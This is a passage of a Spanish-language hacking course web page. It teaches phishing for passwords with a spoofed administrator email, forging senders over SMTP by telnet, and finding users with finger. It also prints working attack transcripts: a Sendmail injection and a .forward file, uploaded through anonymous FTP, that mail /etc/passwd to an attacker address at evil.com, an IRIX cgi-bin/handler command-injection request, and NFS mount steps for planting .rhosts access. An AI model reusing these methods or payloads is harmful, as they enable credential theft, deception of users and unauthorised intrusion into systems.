<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <meta name="Author" content="Miguel Angel [ Punisher '00? ]">
   <meta name="GENERATOR" content="Mozilla/4.74 [en] (Win95; U) [Netscape]">
   <title>Curso de Hacking</title>
</head>
<body>

<center><img SRC="Bar.gif" height=30 width=500>
<br><b><font face="Arial,Helvetica"><font color="#000099"><font size=+4>-CURSO
DE HACKING-</font></font></font></b></center>
<font face="Arial,Helvetica"><font size=-1></font></font>
<p><b><font face="Arial,Helvetica"><font color="#000099">4.2.- INGENIERIA
SOCIAL</font></font></b>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Bien, este no es un metodo
de hack en el sentido que todos pensais... no tiene nada que ver con informatica
ni con ordenadores ni tcp/ip ni unix ni nada de eso sino que simplemente
consiste en ser un poco picaro ;o).</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>La ingenieria social se basa
en que hay mucha gente por ahi que tiene una cuenta (tanto de un proveedor
de internet como una shell) y que no esta muy alerta jeje. En fin, como
os comento hay varios metodos para obtener cuentas usando ingenieria social,
aqui simplemente cuento algunos para que os hagais una idea pero cada uno
que piense y su imaginacion le dara algunos truquillos mas.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>En fin, el metodo e-mail
es el mas importante por el que sera el que mas desarrollaremos en este
texto aunque tambien se podria hacer por telefono. La idea es sencilla..
enviar un mail (anonimo) a alguien para que te de el login y el password.
Parece dificil que traguen, no?.. pues os puedo asegurar que no lo es.
}-)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Simplemente envia un mail
de este estilo:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Estimado se&ntilde;or Lopez:&nbsp;
(Importante conocer la identidad de la persona para darle mas confianza)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>El objeto de este correo
electronico es comunicarle que debido a mantener la seguridad de nuestro
sistema victima.com, se requiere que envie un mail con sus datos personales
y su login y su password ya que en nuestro sistema es muy importante la
seguridad y deseamos mantenerla con estos chequeos rutinarios.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Agradeciendo su atencion
se despide</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Pepito Rodriguez&nbsp;&nbsp;
pepito@victima.com</font></font>
<br><font face="Arial,Helvetica"><font size=-1>Administrador del sistema
victima.com</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Para enviar un mail para
falsear el remitente, lo que se debe hacer es hacer un telnet a una maquina
unix que tenga el puerto 25 abierto y dar los siguientes pasos:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Lo primero que se ha de hacer
es un telnet maquinacon25.com 25, cuando te diga que ya estas conectado,
has de hacer:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>helo ingenieria@social.com
>pleased to meet ingenieria@social.com</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Tras esto has de decir quien
quieres que aparezca como remitente con el comando mail from:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>mail from: ingenieria@social.com</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
> ingenieria@social.com... Sender is valid.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Si sale esto, todo va bien..
por lo que tendras que indicar quien es el destinatario usando el comando
rcpt</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>rcpt to: bill@gates.com</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
> "bill@gates.com"... Recipient okay</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Tras esto, lo que se ha de
hacer es indicar el mensaje en si con el comando data y cuando quieras
acabar pones un . en una linea.. algo asi:</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
data</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
> Enter mail, end with "." on a line by itself</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Hola Bill</font></font>
<br><font face="Arial,Helvetica"><font size=-1>.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
> Mail accepted</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Con esto el mensaje ya esta
enviado, y para cerrar la conexion has de usar quit.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
> connection is closed.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>En realidad con esto no se
consigue un mail anonimo sino que lo que consigues es especificar el remitente
que tu quieres. Para enviar mail anonimo has de usar servidores de correo
anonimo o hacer este mensaje enlazando unos mails con otros.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Para saber si un servidor
es anonimo has de hacer:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>HELO servidor@anonimo.com</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Y si cuando el servidor responde
no aparece tu IP por ningun lado, entonces es un servidor anonimo o pseudoanonimo.</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Este texto puede estar mucho
mas elaborado.. pero ya os servira para ver la idea y creedme este metodo
funciona y por otro lado no es complicado de hacer ;o)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>La pregunta ahora es... como
sabemos los telefonos o los mails de la gente de victima.com???. Bien,
hay varias respuestas.. muchas veces por casualidad (un vecino, un compa&ntilde;ero
de clase, etc), otras pasandotelas otro hacker ( a saber de donde vendran
&iexcl;!) y algunos metodos mas entre los que destacaria el finger. El
finger es el puerto 79 y si el host victima.com lo tiene abierto, simplemente
telnetealo y usando finger –l @victima.com sacaras informacion sobre la
gente que esta concectada a victima.com asi como otra informacion interesante
como su email. Luego puedes ir probando con finger –l nombre_usuario@victima.com
con lo que obtendras aun mas informacion del sistema.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Tambien se puede hacer finger
root@victima.com , guest@victima.com, etc con lo que obtendras informacion
sobre ellos aunque no esten conectados.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Tambien se ha de tener en
cuenta que a veces el puerto 79 esta abierto pero no te da informacion.
Esto puede ser porque esta usando tcp-wrappers, pero eso es tema aparte,
simplemente lo comento para que sepais que os puede pasar.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Este metodo, y usando este
script, os puede hacer conseguir muchos passwords pero hay que currarselo
mucho :o(. Obviamente, solo pensando un poco se te pueden ocurrir muchas
mas maneras de aprovechar el finger ya que da bastante informacion sobre
los usuarios aunque esta informacion cuando es realmente util es combinada
con otros sistemas de ataque :)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Hay muchos mas sistemas de
ingenieria social como la chica necesitada de ayuda en el irc y cosas parecidas,
pero tampoco creo que valga demasiado la pena explicarlo mas. Ademas, como
en todos estos temas, el unico limite es tu imaginacion :o)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Como es pesado buscar manualmente,
puedes buscar maquinas con finger usando un script hecho en shell y usando
listas de hosts como las que se explicaran en el apartado de nfs.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Ademas, para los que veais
que este metodo es un poco co&ntilde;azo, el script este siempre es util
ya que tened en cuenta que las maquinas que tengan el finger abierto son
maquinas que no estan muy concienciadas por la seguridad no?.. jeje.. mejor
no sigo dando ideas&nbsp;&nbsp; :o) aunque tened en cuenta que esto no
siempre sera cierto ya que es posible que usen los tcp-wrappers.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Nota: El tcp-wrapper es un
programa que permite filtrar ip por los distintos puertos e indicar que
demonio o programa se ejecuta en cada uno de los puertos por lo que podeis
ver todas las aplicaciones maleficas que pueden conseguir los roots usando
este tipo de programas por lo que cuidado ahi fuera.</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><b><font face="Arial,Helvetica"><font color="#000099">4.3.- CONSEGUIR
FICHERO DE PASSWD A TRAVES DE ALGUN BUG</font></font></b>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>En fin, hay muchos bugs y
xploits que te permiten el acceso al fichero de passwd pero aqui voy a
exponer algunos que aunque son antiguos son bastante ilustrativos (para
pillar xploits nuevos, a buscar por la red ke hay muchos.. de todos modos,
en los apartados de pillar root, pondre xploits modernos y que funcionan
;o).. estos los he elegido aunque sean un poco antiguos porque son bastante
ilustrativos:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Sistemas: Unix's en general,
espacialmente AIX y SUNOS</font></font>
<br><font face="Arial,Helvetica"><font size=-1>Versiones: Sendmail, versiones
anteriores a la 5.57 que no esten parcheadas</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;tumaquina% telnet
victima.com 25</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;Trying X.Y.Z.A...</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;Connected to victima.com</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;Escape character is
'^]'.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;220 victima.com Sendmail
5.55 ready at Saturday, 6 Nov 93 18:04</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;mail from: "|/bin/mail
tu_direccion@de_correo.com &lt; /etc/passwd"</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;250 "|/bin/mail tu_direccion@de_correo.com
&lt; /etc/passwd"... Sender ok</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;rcpt to: loquequieras</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;550 loquequieras...
User unknown</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;data</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;354 Enter mail, end
with "." on a line by itself</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;250 Mail accepted</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;quit</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;Connection closed
by foreign host.</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Notas:</font></font>
<br><font face="Arial,Helvetica"><font size=-1>-victima.com = nombre del
ordenador a hackear</font></font>
<br><font face="Arial,Helvetica"><font size=-1>-mimaquina = nombre de nuestro
ordenador</font></font>
<br><font face="Arial,Helvetica"><font size=-1>-Lo que aparece con un numero
delante son mensajes de nuestra victima,</font></font>
<br><font face="Arial,Helvetica"><font size=-1>el resto es lo que tienes
que escribir.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>La idea de este bug, es que
usualmente, en el sendmail en la linea de mail from: pondrias pepe@uno.es
, pero sin embargo, y la gracia esta aqui, le dices que te mande el fichero
/etc/passwd. Pero os digo una cosa sinceramente, este bug no funciona casi
nunca, y si funciona, felicidades , estas en una maquina que el rOOt no
tiene ni puta idea,</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Como conseguir el fichero
/etc/passwd si el ftp esta mal configurado</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>La victima debe de tener
una copia completa del fichero /etc/passwd en su ftp anonimo -ftp/etc en
vez de una version reducida. Sin embargo, puedes ver que normalmente nunca
aparece el fichero verdadero :( , pero el home directory de "ftp" puede
ser escribible en victim.com. Esto te permite ejecutar comandos remotamente
- en este caso, mandarte el archivo por mail a ti mismo - por el simple
metodo de crear un archivo .forward que ejecuta un comando cuando un mail
es mandado a la cuenta "ftp".</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>evil % cat forward_sucker_file</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;"|/bin/mail zen@evil.com
&lt; /etc/passwd"</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;evil % ftp victim.com</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;Connected to victim.com</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;220 victim FTP server
ready.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;Name (victim.com:zen):
ftp</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;331 Guest login ok,
send ident as password.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;Password:</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;230 Guest login ok,
access restrictions apply.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;ftp> ls -lga</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;200 PORT command successful.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;150 ASCII data connection
for /bin/ls (192.192.192.1,1129) (0 bytes).</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;total 5</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;drwxr-xr-x&nbsp; 4
101&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
512 Jun 20&nbsp; 1991 .</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;drwxr-xr-x&nbsp; 4
101&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
512 Jun 20&nbsp; 1991 ..</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;drwxr-xr-x&nbsp; 2
0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
512 Jun 20&nbsp; 1991 bin</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;drwxr-xr-x&nbsp; 2
0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
512 Jun 20&nbsp; 1991 etc</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;drwxr-xr-x&nbsp; 3
101&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
512 Aug 22&nbsp; 1991 pub</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;226 ASCII Transfer
complete.</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;242 bytes received
in 0.066 seconds (3.6 Kbytes/s)</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;ftp> put forward_sucker_file
.forward</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;43 bytes sent in 0.0015
seconds (28 Kbytes/s)</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;ftp> quit</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;evil % echo test |
mail ftp@victim.com</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Ahora simplemente tienes
que esperar a que el fichero de passwords te sea</font></font>
<br><font face="Arial,Helvetica"><font size=-1>enviado.</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Ejecutar comandos de manera
remota en Irix con cgi-bin/handler</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>El cgi-bin/handler en los
sistemas IRIX permite la lectura y escritura de ficheros. Sin embargo existe
un bug que da paso a la ejecucion remota de comandos. El sistema intentara
abrir el fichero (taluego_Lucas) y si no existe dara un mensaje de error
para a continuacion &shy;ejecutar el comando que sigue. Muy importante,
el espacio entre el comando cat y su argumento es un *tabulador* (TAB),
no se admiten espacios asi que aunque podeis poner otro comando que no
sea cat no podreis poner ningun comando que requiera espacios.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
$ telnet victima.com 80</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
$ GET /cgi-bin/handler/taluego_Lucas;cat&nbsp;&nbsp; /etc/passwd|?data=Download</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
$ HTTP/1.0</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>En IRIX 6.3 se intento arreglar
esto pero lo unico que se consiguio fue que el</font></font>
<br><font face="Arial,Helvetica"><font size=-1>formato del bug pase a ser:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
$telnet victima.com 80</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
$GET /cgi-bin/handler/whatever;cat&nbsp;&nbsp;&nbsp; /etc/passwd|&nbsp;&nbsp;
?data=Download</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
$HTTP/1.0</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Con un nuevo TAB para "enga&ntilde;ar"
al script PERL.</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Hay muchos mas, pero no me
apetece seguir buscando.. quiza para posteriores ediciones...ademas en
esta categoria tambien entra el PHF que esta explicado mas adelante.</font></font>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><b><font face="Arial,Helvetica"><font color="#000099">4.4.- MOUNT</font></font></b>
<br><font face="Arial,Helvetica"><font size=-1></font></font>&nbsp;<font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Este no es un bug, sino un
defecto de configuracion del NFS. Aqui voy a intentar explicarlo extensamente
para que sepais lo que estais haciendo:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>El NFS (Network File System)
es un sistema de red que permite que una maquina servidor pueda hacer disponibles
sistemas de archivos y dispositivos perifericos a maquinas clientes. Asi,
la maquina cliente podra montar esos directorios pudiendolos usar como
si los poseyera.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Otra cosa muy distinta es
lo que se pueda hacer con los ficheros incluidos en dichos directorios
(si se pueden borrar, modificar, alterar los permisos, etc), lo cual depende
de la configuracion del NFS. En realidad, no es dificil configurar el NFS
para que no pueda haber problemas de seguridad, usando las opciones ro
y rw en la configuracion que indican que clientes tienen acceso de lectura
y escritura respectivamente. Por tanto, los problemas aparecen cuando no
han sido utlidas estas opciones correctamente y cualquier usuario remoto
puede leer y escribir... gracias a dios hay root que dan facilidades :o)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Mount es el comando en unix
que permite montar archivos en tu maquina para conseguir el objetivo expuesto
anteriormente.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Para ver si una maquina remota
con NFS tiene files montables se hace siendo root en la maquina donde estas
usando el comando showmount. Este comando se utiliza para determinar que
sistema ha montado un sistema de archivos desde un sistema dado. Con el
parametro –a muestra todos los sistemas de archivos que se han montado
desde el nodo servidor mientras que el comando –e muestra la lista de todos
los sistemas de archivos exportados.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Como root, has de ejecutar
en tu maquina:</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>$root> showmount –e hostvictima.com</font></font>
<br><font face="Arial,Helvetica"><font size=-1>mount clntudp_create: RPC:
Port mapper failure - RPC: Unable to receive</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Si la respuesta es algo de
este estilo... quiere decir que no ha habido suerte :o(</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>$root> showmount -e otra.net</font></font>
<br><font face="Arial,Helvetica"><font size=-1>Export list for otra.net:</font></font>
<br><font face="Arial,Helvetica"><font size=-1>/var/mail&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
makina1.otra.net</font></font>
<br><font face="Arial,Helvetica"><font size=-1>/home/user1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
makina1.otra.net</font></font>
<br><font face="Arial,Helvetica"><font size=-1>/usr/local&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pluto.seva.net,rover.seva.net</font></font>
<br><font face="Arial,Helvetica"><font size=-1>/export/X11R6.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
makina2.otra.net</font></font>
<br><font face="Arial,Helvetica"><font size=-1>/export/rover&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
makina1.otra.net,makina2.otra.net</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>En esta maquina no hay accesos
del tipo everyone que sean interesantes :o( .. bueno con otras tecnicas
mas avanzadas si.. pero no son el objeto de este texto ;o)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Seguimos buscando hasta que
encontremos una maquina victim.com que nos ponga algo del tipo</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>/home&nbsp;&nbsp; (everyone)</font></font>
<br><font face="Arial,Helvetica"><font size=-1>o</font></font>
<br><font face="Arial,Helvetica"><font size=-1>/&nbsp;&nbsp; (everyone)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>BINGO!!!!!</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Una vez pillemos una makina
de estas caracteristicas, se pueden hacer muchas cosas pero voy a explicar
el metodo tipico expuesto en los textos de hacking aunque pensando un poko
se te pueden okurrir otros :)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Lo que vamos a hacer es crear
una cuenta rapper (rapper es el nombre de un usuario de la maquina remota..
para cada caso sera uno distinto) en nuestro fichero de passwd local (
es decir, el de nuestra maquina) y luego como usuario rapper ( cambiamos
a ese usuario con el su) pondremos una entra .rhosts en su directorio home
para poder hacer un rlogin sin password.</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>Primero, creamos el directorio
donde lo vamos a montar</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>mimaquina:~>mkdir /tmp/mount</font></font>
<br><font face="Arial,Helvetica"><font size=-1>mimaquina:~>mount -nt nfs
victim.com:/home /tmp/mount/</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>y con esto ya tendremos montado
el directorio de la maquina remota en nuestra maquina local con lo que
haciendo un ls en /tmp/mount veremos todos sus archivos :o)</font></font><font face="Arial,Helvetica"><font size=-1></font></font>
<p><font face="Arial,Helvetica"><font size=-1>mimaquina:~>ls -lsa /tmp/mount/</font></font>
<br><font face="Arial,Helvetica"><font size=-1>total 9</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxrwxr-x&nbsp;&nbsp;
8 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Jul&nbsp; 4 20:34 ./</font></font>
<br><font face="Arial,Helvetica"><font size=-1>&nbsp;&nbsp; 1 drwxr-xr-x&nbsp;
19 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1024 Oct&nbsp; 8 13:42 ../</font></font>
